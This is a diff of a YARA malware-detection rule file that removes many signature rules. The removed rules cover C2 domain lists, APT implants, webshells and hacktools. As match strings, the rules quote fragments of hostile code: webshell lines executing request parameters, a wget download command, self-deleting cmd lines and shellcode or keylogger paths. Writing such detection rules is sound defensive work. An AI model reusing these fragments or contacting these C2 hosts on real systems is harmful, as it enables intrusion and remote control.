-      $c2_1344 = "www.zaigawebinfo.rebatesrule.net" ascii
-      $c2_1345 = "www.zebra.incloud-go.com" ascii
-      $c2_1346 = "www2.qpoe.com" ascii
-      $c2_1347 = "www2.zyns.com" ascii
-      $c2_1348 = "www2.zzux.com" ascii
-      $c2_1349 = "x7.usyahooapis.com" ascii
-      $c2_1350 = "xi.dyndns.pro" ascii
-      $c2_1351 = "xi.sexxxy.biz" ascii
-      $c2_1352 = "xread10821.9966.org" ascii
-      $c2_1353 = "xsince.tk" ascii
-      $c2_1354 = "xt.dnset.com" ascii
-      $c2_1355 = "xyrn998754.2288.org" ascii
-      $c2_1356 = "yahoo.incloud-go.com" ascii
-      $c2_1357 = "yallago.cu.cc" ascii
-      $c2_1358 = "yandexr.sellclassics.com" ascii
-      $c2_1359 = "yeahyeahyeahs.3322.org" ascii
-      $c2_1360 = "yeap1.jumpingcrab.com" ascii
-      $c2_1361 = "yfrfyhf.youdontcare.com" ascii
-      $c2_1362 = "yo.acmetoy.com" ascii
-      $c2_1363 = "za.myftp.info" ascii
-      $c2_1364 = "zabbix.servercontrols.pw" ascii
-      $c2_1365 = "zaigawebinfo.rebatesrule.net" ascii
-      $c2_1367 = "zebra.UsFfUnicef.com" ascii
-      $c2_1368 = "zebra.bdoncloud.com" ascii
-      $c2_1369 = "zebra.incloud-go.com" ascii
-      $c2_1370 = "zebra.unhamj.com" ascii
-      $c2_1371 = "zebra.wthelpdesk.com" ascii
-      $c2_1372 = "zero.pcanywhere.net" ascii
-      $c2_1373 = "zg.ns02.biz" ascii
-      $c2_1374 = "zone.demoones.com" ascii
-   condition:
-      1 of ($c2_*)
 }
 
 rule Codoso_Gh0st_1 {
@@ -22226,33 +20396,6 @@ rule WEBSHELL_ASPX_FileExplorer_Mar21_1 {
       ( 1 of ($x*) or 2 of them ) or 4 of them
 }
 
-rule Greenbug_Malware_5 {
-   meta:
-      description = "Auto-generated rule"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://goo.gl/urp4CD"
-      date = "2017-01-25"
-      modified = "2023-01-27"
-      super_rule = 1
-      hash1 = "308a646f57c8be78e6a63ffea551a84b0ae877b23f28a660920c9ba82d57748f"
-      hash2 = "44bdf5266b45185b6824898664fd0c0f2039cdcb48b390f150e71345cd867c49"
-      hash3 = "7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c"
-      hash4 = "82beaef407f15f3c5b2013cb25901c9fab27b086cadd35149794a25dce8abcb9"
-      id = "12362711-f466-5f9e-9227-1cf84aec93e5"
-   strings:
-      $x1 = "cmd /u /c WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter" fullword ascii
-      $x2 = "cmd /a /c net user administrator /domain >>" fullword ascii
-      $x3 = "cmd /a /c netstat -ant >>\"%localappdata%\\Microsoft\\" ascii
-
-      $o1 = "========================== (Net User) ==========================" ascii fullword
-   condition:
-      filesize < 2000KB and (
-         ( uint16(0) == 0x5a4d and 1 of them ) or
-         $o1
-      )
-}
-
 rule APT_Thrip_Sample_Jun18_2 {
    meta:
       description = "Detects sample found in Thrip report by Symantec "
@@ -22440,29 +20583,6 @@ rule VBS_dropper_script_Dec17_1 {
       filesize < 600KB and $a1 and 1 of ($s*)
 }
 
-rule SUSP_PDB_Strings_Keylogger_Backdoor : HIGHVOL {
-   meta:
-      description = "Detects PDB strings used in backdoors or keyloggers"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "Internal Research"
-      date = "2018-03-23"
-      score = 65
-      id = "190daadb-0de6-5665-a241-95c374dbda47"
-   strings:
-      $ = "\\Release\\PrivilegeEscalation"
-      $ = "\\Release\\KeyLogger"
-      $ = "\\Debug\\PrivilegeEscalation"
-      $ = "\\Debug\\KeyLogger"
-      $ = "Backdoor\\KeyLogger_"
-      $ = "\\ShellCode\\Debug\\"
-      $ = "\\ShellCode\\Release\\"
-      $ = "\\New Backdoor"
-   condition:
-      uint16(0) == 0x5a4d and filesize < 1000KB
-      and 1 of them
-}
-
 rule SUSP_Script_Obfuscation_Char_Concat {
    meta:
       description = "Detects strings found in sample from CN group repo leak in October 2018"
@@ -22554,34 +20674,6 @@ rule SUSP_SFX_cmd {
       uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them
 }
 
-rule SUSP_PDB_Path_Keywords {
-   meta:
-      description = "Detects suspicious PDB paths"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://twitter.com/stvemillertime/status/1179832666285326337?s=20"
-      date = "2019-10-04"
-      id = "cbd9b331-58bb-5b29-88a2-5c19f12893a9"
-   strings:
-      $ = "Debug\\Shellcode" ascii
-      $ = "Release\\Shellcode" ascii
-      $ = "Debug\\ShellCode" ascii
-      $ = "Release\\ShellCode" ascii
-      $ = "Debug\\shellcode" ascii
-      $ = "Release\\shellcode" ascii
-      $ = "shellcode.pdb" nocase ascii
-      $ = "\\ShellcodeLauncher" ascii
-      $ = "\\ShellCodeLauncher" ascii
-      $ = "Fucker.pdb" ascii
-      $ = "\\AVFucker\\" ascii
-      $ = "ratTest.pdb" ascii
-      $ = "Debug\\CVE_" ascii
-      $ = "Release\\CVE_" ascii
-      $ = "Debug\\cve_" ascii
-      $ = "Release\\cve_" ascii
-   condition:
-      uint16(0) == 0x5a4d and 1 of them
-}
-
 rule SUSP_Encoded_Discord_Attachment_Oct21_1 {
    meta:
       description = "Detects suspicious encoded URL to a Discord attachment (often used for malware hosting on a legitimate FQDN)"
@@ -22638,26 +20730,6 @@ rule SUSP_PowerShell_Caret_Obfuscation_2 {
       1 of them
 }
 
-rule SUSP_OBFUSC_PowerShell_True_Jun20_1 {
-   meta:
-      description = "Detects indicators often found in obfuscated PowerShell scripts. Note: This detection is based on common characteristics typically associated with the mentioned threats, must be considered a clue and does not conclusively prove maliciousness."
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://github.com/corneacristian/mimikatz-bypass/"
-      date = "2020-06-27"
-      score = 75
-      id = "e9bb870b-ad72-57d3-beff-2f84a81490eb"
-   strings:
-      $ = "${t`rue}" ascii nocase
-      $ = "${tr`ue}" ascii nocase
-      $ = "${tru`e}" ascii nocase
-      $ = "${t`ru`e}" ascii nocase
-      $ = "${tr`u`e}" ascii nocase
-      $ = "${t`r`ue}" ascii nocase
-      $ = "${t`r`u`e}" ascii nocase
-   condition:
-      filesize < 6000KB and 1 of them
-}
-
 rule APT6_Malware_Sample_Gen : FILE {
    meta:
       description = "Rule written for 2 malware samples that communicated to APT6 C2 servers"
@@ -22705,23 +20777,6 @@ rule APT6_Malware_Sample_Gen : FILE {
          ( ( 1 of ($x*) and 3 of ($s*) ) or 1 of ($c*) )
       ) or
       ( 6 of them )
-}
-
-rule WEBSHELL_Z_Webshell_2 {
-   meta:
-      description = "Detection for the z_webshell"
-      author = "DHS NCCIC Hunt and Incident Response Team"
-      date = "2018/01/25"
-      old_rule_name = "z_webshell"
-      md5 =  "2C9095C965A55EFC46E16B86F9B7D6C6"
-      id = "9a54925f-de10-567f-a1ea-5e7522b47dfd"
-   strings:
-      $webshell_name = "public string z_progname =" nocase ascii wide
-      $webshell_password = "public string Password =" nocase ascii wide
-   condition:
-      ( uint32(0) == 0x2040253c or uint32(0) == 0x7073613c )
-      and filesize < 100KB
-      and 2 of ($webshell_*)
 }
 
 rule TA18_074A_scripts {
@@ -23092,23 +21147,6 @@ rule MAL_APT_NK_Andariel_LilithRAT_Variant {
          or 4 of ($unique_*)
          or 1 of ($lilith_4, $unique_2) // both strings are very specific - let's use them as a unique indicator, F.R.
       ) 
-}
-
-rule MAL_APT_NK_Andariel_GoLang_Validalpha_Tasks {
-   meta:
-      author = "CISA.gov"
-      description = "Detects a variant of the GoLang Validalpha malware"
-      reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a"
-      date = "2024-07-25"
-      score = 80
-      id = "caa67a79-3ea6-5910-971c-f311722570ff"
-   strings:
-      $ = "main.ScreenMonitThread"
-      $ = "main.CmdShell"
-      $ = "main.GetAllFoldersAndFiles"
-      $ = "main.SelfDelete"
-   condition:
-      all of them
 }
 
 rule MAL_APT_NK_Andariel_BindShell {
@@ -23758,63 +21796,6 @@ rule APT_MAL_LNX_RedMenshen_BPFDoor_Controller_May22_1 {
    condition:
       uint16(0) == 0x457f and
       filesize < 80KB and 2 of them or 5 of them
-}
-
-rule APT_MAL_LNX_RedMenshen_BPFDoor_Tricephalic_Implant_May22 {
-
-    meta:
-      description = "Detects BPFDoor/Tricephalic Hellkeeper passive implant"
-      author = "Exatrack"
-      reference = "https://exatrack.com/public/Tricephalic_Hellkeeper.pdf"
-      date = "2022-05-09"
-      score = 90
-
-    strings:
-        $str_message_01 = "hald-addon-acpi: listening on acpi kernel interface /proc/acpi/event"
-        $str_message__02 = "/var/run/haldrund.pid"
-        
-        //$str_message_03 = "/bin/rm -f /dev/shm/%s;/bin/cp %s /dev/shm/%s && /bin/chmod 755 /dev/shm/%s && /dev/shm/%s --init && /bin/rm -f /dev/shm/%s" // in the stack
-        
-        $str_message_04 = "Cant fork pty"
-        $str_hald_05 = "/sbin/iptables -t nat -D PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d"
-        
-        //$str_command_01 = "/sbin/iptables -t nat -A PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d"
-        //$str_command_02 = "/sbin/iptables -I INPUT -p tcp -s %s -j ACCEPT"
-        
-        $str_command_03 = "/bin/rm -f /dev/shm/%s"
-        
-        //$str_command_04 = "/bin/cp %s /dev/shm/%s"
-        //$str_command_05 = "/bin/chmod 755 /dev/shm/%s"
-
-        // $str_command_06 = "/dev/shm/%s --init"
-        // $str_server_01 = "[+] Spawn shell ok."
-        // $str_server_02 = "[+] Monitor packet send."
-
-        $str_server_03 = "[-] Spawn shell failed."
-        $str_server_04 = "[-] Can't write auth challenge"
-        $str_server_05 = "[+] Packet Successfuly Sending %d Size."
-        $str_server_06 = "[+] Challenging %s."
-        $str_server_07 = "[+] Auth send ok."
-        $str_server_08 = "[+] possible windows"
-
-        $str_filter_01 = "(udp[8:2]=0x7255)"
-        $str_filter_02 = "(icmp[8:2]=0x7255)"
-        $str_filter_03 = "(tcp[((tcp[12]&0xf0)>>2):2]=0x5293)"
-        
-        // $str_filter_04 = {15 00 ?? ?? 55 72 00 00}
-        //$str_filter_05 = {15 00 ?? ?? 93 52 00 00}
-        
-        $error_01 = "[-] socket"
-        $error_02 = "[-] listen"
-        $error_03 = "[-] bind"
-        $error_04 = "[-] accept"
-        $error_05 = "[-] Mode error."
-        $error_06 = "[-] bind port failed."
-        $error_07 = "[-] setsockopt"
-        $error_08 = "[-] missing -s"
-        $error_09 = "[-] sendto"
-    condition:
-        any of ($str*) or 3 of ($error*)
 }
 
 rule power_pe_injection
@@ -24510,25 +22491,6 @@ rule PlugX_J16_Gen2 {
 		( uint16(0) == 0x5a4d and filesize < 600KB and ( 2 of ($s*) ) ) or ( 5 of them )
 }
 
-rule WaterBug_fa_malware {
-	meta:
-		description = "Symantec Waterbug Attack - FA malware variant"
-		author = "Symantec Security Response"
-		date = "2015-01-22"
-		modified = "2023-01-27"
-		reference = "http://t.co/rF35OaAXrl"
-		id = "b09f798a-2875-59ca-b880-971d8f973c76"
-	strings:
-		$string1 = "C:\\proj\\drivers\\fa _ 2009\\objfre\\i386\\atmarpd.pdb"
-		$string2 = "d:\\proj\\cn\\fa64\\"
-		$string3 = "sengoku_Win32.sys\x00"
-		$string4 = "rk_ntsystem.c"
-		$string5 = "\\uroboros\\"
-		$string6 = "shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}"
-	condition:
-		uint16(0) == 0x5A4D  and (any of ($string*))
-}
-
 rule apt_win32_dll_rat_hiZorRAT
 {
 	meta:
@@ -24556,95 +22518,6 @@ rule apt_win32_dll_rat_hiZorRAT
 		$s8 = "%08x%08x%08x%08x" wide ascii
 	condition:
 		(uint16(0) == 0x5A4D or uint32(0) == 0x464c457f) and (all of them)
-}
-
-rule WEBSHELL_PAS_webshell {
-   meta:
-      author = "FR/ANSSI/SDO (modified by Florian Roth)"
-      description = "Detects P.A.S. PHP webshell - Based on DHS/FBI JAR-16-2029 (Grizzly  Steppe)"
-      reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
-      date = "2021-02-15"
-      score = 70
-      id = "862aab77-936e-524c-8669-4f48730f4ed5"
-   strings:
-      $php = "<?php"
-      $strreplace = "(str_replace("
-      $md5 = ".substr(md5(strrev($"
-      $gzinflate = "gzinflate"
-      $cookie = "_COOKIE"
-      $isset = "isset"
-   condition:
-      ( filesize > 20KB and filesize < 200KB ) and
-      all of them
-}
-
-rule WEBSHELL_PAS_webshell_ZIPArchiveFile {
-   meta:
-      author = "FR/ANSSI/SDO (modified by Florian Roth)"
-      description = "Detects an archive file created by P.A.S. for download operation"
-      reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
-      date = "2021-02-15"
-      score = 80
-      id = "081cc65b-e51c-59fc-a518-cd986e8ee2f7"
-   strings:
-      $s1 = "Archive created by P.A.S. v."
-   condition:
-      $s1
-}
-
-rule WEBSHELL_PAS_webshell_PerlNetworkScript {
-   meta:
-      author = "FR/ANSSI/SDO"
-      description = "Detects PERL scripts created by P.A.S. webshell"
-      reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
-      date = "2021-02-15"
-      score = 90
-      id = "1625b63f-ead7-5712-92b4-0ce6ecc49fd4"
-   strings:
-      $pl_start = "#!/usr/bin/perl\n$SIG{'CHLD'}='IGNORE'; use IO::Socket; use FileHandle;"
-      $pl_status = "$o=\" [OK]\";$e=\" Error: \""
-      $pl_socket = "socket(SOCKET, PF_INET, SOCK_STREAM,$tcp) or die print \"$l$e$!$l"
-      $msg1 = "print \"$l OK! I\\'m successful connected.$l\""
-      $msg2 = "print \"$l OK! I\\'m accept connection.$l\""
-   condition:
-      filesize < 6000 and
-      ( $pl_start at 0 and all of ($pl*) ) or
-      any of ($msg*)
-}
-
-rule WEBSHELL_PAS_webshell_SQLDumpFile {
-   meta:
-      author = "FR/ANSSI/SDO"
-      description = "Detects SQL dump file created by P.A.S. webshell"
-      reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
-      date = "2021-02-15"
-      score = 90
-      id = "4c26feeb-3031-5c91-9eeb-4b5fe9702e39"
-   strings:
-      $ = "-- [ SQL Dump created by P.A.S. ] --"
-   condition:
-      1 of them
-}
-
-rule APT_MAL_Sandworm_Exaramel_Task_Names {
-   meta:
-      author = "FR/ANSSI/SDO"
-      description = "Detects names of the tasks received from the CC server in Exaramel malware"
-      reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
-      date = "2021-02-15"
-      score = 80
-      id = "185f2f3b-bf5c-54af-bca2-400d08bf9c91"
-   strings:
-      $ = "App.Delete"
-      $ = "App.SetServer"
-      $ = "App.SetProxy"
-      $ = "App.SetTimeout"
-      $ = "App.Update"
-      $ = "IO.ReadFile"
-      $ = "IO.WriteFile"
-      $ = "OS.ShellExecute"
-   condition:
-      all of them
 }
 
 rule PassCV_Sabre_Malware_Excalibur_1 {
@@ -25501,32 +23374,6 @@ rule MAL_BurningUmbrella_Sample_21 {
       uint16(0) == 0x5a4d and filesize < 500KB and 2 of them
 }
 
-rule MAL_AirdViper_Sample_Apr18_1 {
-   meta:
-      description = "Detects Arid Viper malware sample"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "Internal Research"
-      date = "2018-05-04"
-      hash1 = "9f453f1d5088bd17c60e812289b4bb0a734b7ad2ba5a536f5fd6d6ac3b8f3397"
-      id = "00f118d1-be1c-5f50-a50f-591f824a1a53"
-   strings:
-      $x1 = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"%s\"" fullword ascii
-      $x2 = "daenerys=%s&" ascii
-      $x3 = "betriebssystem=%s&anwendung=%s&AV=%s" ascii
-
-      $s1 = "Taskkill /IM  %s /F &  %s" fullword ascii
-      $s2 = "/api/primewire/%s/requests/macKenzie/delete" fullword ascii
-      $s3 = "\\TaskWindows.exe" ascii
-      $s4 = "MicrosoftOneDrives.exe" fullword ascii
-      $s5 = "\\SeanSansom.txt" ascii
-   condition:
-      uint16(0) == 0x5a4d and filesize < 6000KB and (
-         1 of ($x*) or
-         4 of them
-      )
-}
-
 rule HKTL_RemoteCmd {
 	meta:
 		description = "Detects a remote access tool used by APT groups - file RemoteCmd.exe"
@@ -25890,65 +23737,6 @@ rule HKTL_NET_GUID_AESShellCodeInjector {
         (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
 }
 
-rule TRITON_ICS_FRAMEWORK {
-      meta:
-          author = "nicholas.carr @itsreallynick"
-          hash = "0face841f7b2953e7c29c064d6886523"
-          description = "TRITON framework recovered during Mandiant ICS incident response"
-          reference = "https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html"
-          id = "af21e55e-ab09-5800-8aac-aee63ae8582c"
-      strings:
-          $python_compiled = ".pyc" nocase ascii wide
-          $python_module_01 = "__module__" nocase ascii wide
-          $python_module_02 = "<module>" nocase ascii wide
-          $python_script_01 = "import Ts" nocase ascii wide
-          $python_script_02 = "def ts_" nocase ascii wide
-
-          $py_cnames_01 = "TS_cnames.py" nocase ascii wide
-          $py_cnames_02 = "TRICON" nocase ascii wide
-          $py_cnames_03 = "TriStation " nocase ascii wide
-          $py_cnames_04 = " chassis " nocase ascii wide
-
-          $py_tslibs_01 = "GetCpStatus" nocase ascii wide
-          $py_tslibs_03 = " sequence" nocase ascii wide
-          $py_tslibs_04 = /import Ts(Hi|Low|Base)[^:alpha:]/ nocase ascii wide
-          $py_tslibs_05 = /module\s?version/ nocase ascii wide
-          $py_tslibs_07 = "prog_cnt" nocase ascii wide
-
-          $py_tsbase_01 = "TsBase.py" nocase ascii wide
-          $py_tsbase_02 = ".TsBase(" nocase ascii wide
-
-          $py_tshi_01 = "TsHi.py" nocase ascii wide
-          $py_tshi_02 = "keystate" nocase ascii wide
-          $py_tshi_03 = "GetProjectInfo" nocase ascii wide
-          $py_tshi_04 = "GetProgramTable" nocase ascii wide
-          $py_tshi_05 = "SafeAppendProgramMod" nocase ascii wide
-
-          $py_tslow_01 = "TsLow.py" nocase ascii wide
-          $py_tslow_02 = "print_last_error" ascii nocase wide
-          $py_tslow_03 = ".TsLow(" ascii nocase wide
-          $py_tslow_05 = " TCM found" nocase ascii wide  
-
-          $py_crc_01 = "crc.pyc" nocase ascii wide
-          $py_crc_02 = "CRC16_MODBUS" ascii wide
-          $py_crc_03 = "Kotov Alaxander" nocase ascii wide
-          $py_crc_04 = "CRC_CCITT_XMODEM" ascii wide
-          $py_crc_05 = "crc16ret" ascii wide
-          $py_crc_06 = "CRC16_CCITT_x1D0F" ascii wide
-          $py_crc_07 = /CRC16_CCITT[^_]/ ascii wide
-
-          $py_sh_01 = "sh.pyc" nocase ascii wide
-
-          $py_keyword_01 = " FAILURE" ascii wide
-          $py_keyword_02 = "symbol table" nocase ascii wide
-
-          $py_TRIDENT_01 = "inject.bin" ascii nocase wide
-          $py_TRIDENT_02 = "imain.bin" ascii nocase wide
-
-      condition:
-          2 of ($python_*) and 7 of ($py_*) and filesize < 3MB
-}
-
 rule Triton_trilog {
    meta:
       description = "Detects Triton APT malware - file trilog.exe"
@@ -26022,220 +23810,6 @@ rule CACTUSTORCH {
             ( 1 of ($a*) and 1 of ($s*) )
          )
       ) or ( 3 of them )
-}
-
-rule Tools_cmd {
-    meta:
-        description = "Chinese Hacktool Set - file cmd.jSp"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-        reference = "http://tools.zjqhr.com/"
-        date = "2015-06-13"
-        hash = "02e37b95ef670336dc95331ec73dbb5a86f3ba2b"
-        id = "27c3cb44-9351-52a2-8e14-afade14e3384"
-    strings:
-        $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
-        $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"Conn\"" ascii
-        $s2 = "<%@ page import=\"java.io.*\" %>" fullword ascii
-        $s3 = "out.print(\"Hi,Man 2015<br /><!--?Confpwd=023&Conn=ls-->\");" fullword ascii
-        $s4 = "while((a=in.read(b))!=-1){" fullword ascii
-        $s5 = "out.println(new String(b));" fullword ascii
-        $s6 = "out.print(\"</pre>\");" fullword ascii
-        $s7 = "out.print(\"<pre>\");" fullword ascii
-        $s8 = "int a = -1;" fullword ascii
-        $s9 = "byte[] b = new byte[2048];" fullword ascii
-    condition:
-        filesize < 3KB and 7 of them
-}
-
-
-rule trigger_drop {
-    meta:
-        description = "Chinese Hacktool Set - file trigger_drop.php"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-        reference = "http://tools.zjqhr.com/"
-        date = "2015-06-13"
-        hash = "165dd2d82bf87285c8a53ad1ede6d61a90837ba4"
-        id = "3b4f32ff-2de2-5689-869a-8a8f55e7fa0c"
-    strings:
-        $s0 = "$_GET['returnto'] = 'database_properties.php';" fullword ascii
-        $s1 = "echo('<meta http-equiv=\"refresh\" content=\"0;url=' . $_GET['returnto'] . '\">'" ascii
-        $s2 = "@mssql_query('DROP TRIGGER" ascii
-        $s3 = "if(empty($_GET['returnto']))" fullword ascii
-    condition:
-        filesize < 5KB and all of them
-}
-
-rule InjectionParameters {
-    meta:
-        description = "Chinese Hacktool Set - file InjectionParameters.vb"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-        reference = "http://tools.zjqhr.com/"
-        date = "2015-06-13"
-        hash = "4f11aa5b3660c45e527606ee33de001f4994e1ea"
-        id = "a77bd0c6-8857-577f-831a-0fcf2537667e"
-    strings:
-        $s0 = "Public Shared ReadOnly Empty As New InjectionParameters(-1, \"\")" fullword ascii
-        $s1 = "Public Class InjectionParameters" fullword ascii
-    condition:
-        filesize < 13KB and all of them
-}
-
-rule users_list {
-    meta:
-        description = "Chinese Hacktool Set - file users_list.php"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-        reference = "http://tools.zjqhr.com/"
-        date = "2015-06-13"
-        hash = "6fba1a1a607198ed232405ccbebf9543037a63ef"
-        id = "2d90b593-6b65-502c-aeb0-8f2a3d65afd3"
-    strings:
-        $s0 = "<a href=\"users_create.php\">Create User</a>" fullword ascii
-        $s7 = "$skiplist = array('##MS_AgentSigningCertificate##','NT AUTHORITY\\NETWORK SERVIC" ascii
-        $s11 = "&nbsp;<b>Default DB</b>&nbsp;" fullword ascii
-    condition:
-        filesize < 12KB and all of them
-}
-
-rule trigger_modify {
-    meta:
-        description = "Chinese Hacktool Set - file trigger_modify.php"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-        reference = "http://tools.zjqhr.com/"
-        date = "2015-06-13"
-        hash = "c93cd7a6c3f962381e9bf2b511db9b1639a22de0"
-        id = "a7d65a9f-82de-554c-8f20-7560d2160041"
-    strings:
-        $s1 = "<form name=\"form1\" method=\"post\" action=\"trigger_modify.php?trigger=<?php e" ascii
-        $s2 = "$data_query = @mssql_query('sp_helptext \\'' . urldecode($_GET['trigger']) . '" ascii
-        $s3 = "if($_POST['query'] != '')" fullword ascii
-        $s4 = "$lines[] = 'I am unable to read this trigger.';" fullword ascii
-        $s5 = "<b>Modify Trigger</b>" fullword ascii
-    condition:
-        filesize < 15KB and all of them
-}
-
-rule Customize {
-    meta:
-        description = "Chinese Hacktool Set - file Customize.aspx"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-        reference = "http://tools.zjqhr.com/"
-        date = "2015-06-13"
-        hash = "db556879dff9a0101a7a26260a5d0dc471242af2"
-        id = "a69e1234-cc85-5295-a45c-693afdfc368e"
-    strings:
-        $s1 = "ds.Clear();ds.Dispose();}else{SqlCommand cm = Conn.CreateCommand();cm.CommandTex" ascii
-        $s2 = "c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=tr" ascii
-        $s3 = "Stream WF=WB.GetResponseStream();FileStream FS=new FileStream(Z2,FileMode.Create" ascii
-        $s4 = "R=\"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";}Conn.Close();break;" ascii
-    condition:
-        filesize < 24KB and all of them
-}
-
-rule oracle_data {
-    meta:
-        description = "Chinese Hacktool Set - file oracle_data.php"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-        reference = "http://tools.zjqhr.com/"
-        date = "2015-06-13"
-        hash = "6cf070017be117eace4752650ba6cf96d67d2106"
-        id = "faa62dcc-0f59-573c-8722-d07216de151f"
-    strings:
-        $s0 = "$txt=fopen(\"oracle_info.txt\",\"w\");" fullword ascii
-        $s1 = "if(isset($_REQUEST['id']))" fullword ascii
-        $s2 = "$id=$_REQUEST['id'];" fullword ascii
-    condition:
-        all of them
-}
-
-rule reDuhServers_reDuh {
-    meta:
-        description = "Chinese Hacktool Set - file reDuh.jsp"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-        reference = "http://tools.zjqhr.com/"
-        date = "2015-06-13"
-        hash = "377886490a86290de53d696864e41d6a547223b0"
-        id = "c87d971a-a16f-5593-88fb-6bcd207e0841"
-    strings:
-        $s1 = "out.println(\"[Error]Unable to connect to reDuh.jsp main process on port \" +ser" ascii
-        $s4 = "System.out.println(\"IPC service failed to bind to \" + servicePort);" fullword ascii $s17 = "System.out.println(\"Bound on \" + servicePort);" fullword ascii
-        $s5 = "outputFromSockets.add(\"[data]\"+target+\":\"+port+\":\"+sockNum+\":\"+new Strin" ascii
-    condition:
-        filesize < 116KB and all of them
-}
-
-rule item_old {
-    meta:
-        description = "Chinese Hacktool Set - file item-old.php"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-        reference = "http://tools.zjqhr.com/"
-        date = "2015-06-13"
-        hash = "daae358bde97e534bc7f2b0134775b47ef57e1da"
-        id = "c32bbd48-a363-53c7-84c6-c47581e2f9da"
-    strings:
-        $s1 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
-        $s2 = "$sCmd = \"convert \".$sFile.\" -flip -quality 80 \".$sFileOut;" fullword ascii
-        $s3 = "$sHash = md5($sURL);" fullword ascii
-    condition:
-        filesize < 7KB and 2 of them
-}
-
-rule Tools_2014 {
-    meta:
-        description = "Chinese Hacktool Set - file 2014.jsp"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-        reference = "http://tools.zjqhr.com/"
-        date = "2015-06-13"
-        hash = "74518faf08637c53095697071db09d34dbe8d676"
-        id = "bb76321b-003d-5f6b-a84b-425477abe91c"
-    strings:
-        $s0 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
-        $s4 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
-        $s5 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
-    condition:
-        filesize < 715KB and all of them
-}
-
-rule reDuhServers_reDuh_2 {
-    meta:
-        description = "Chinese Hacktool Set - file reDuh.php"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-        reference = "http://tools.zjqhr.com/"
-        date = "2015-06-13"
-        hash = "512d0a3e7bb7056338ad0167f485a8a6fa1532a3"
-        id = "6050dfde-6c79-5dd8-a772-508668177aa5"
-    strings:
-        $s1 = "errorlog(\"FRONTEND: send_command '\".$data.\"' on port \".$port.\" returned \"." ascii
-        $s2 = "$msg = \"newData:\".$socketNumber.\":\".$targetHost.\":\".$targetPort.\":\".$seq" ascii
-        $s3 = "errorlog(\"BACKEND: *** Socket key is \".$sockkey);" fullword ascii
-    condition:
-        filesize < 57KB and all of them
-}
-
-rule Customize_2 {
-    meta:
-        description = "Chinese Hacktool Set - file Customize.jsp"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-        reference = "http://tools.zjqhr.com/"
-        date = "2015-06-13"
-        hash = "37cd17543e14109d3785093e150652032a85d734"
-        id = "1f7e9063-33d8-5df4-89d5-7d8fc1be61f0"
-    strings:
-        $s1 = "while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}}" fullword ascii
-        $s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii
-    condition:
-        filesize < 30KB and all of them
 }
 
 rule item_old {
@@ -26578,87 +24152,6 @@ rule SUSP_PY_PYInstaller_Swiper_Jun25 {
       and all of them
 }
 
-rule sethc_ANOMALY {
-	meta:
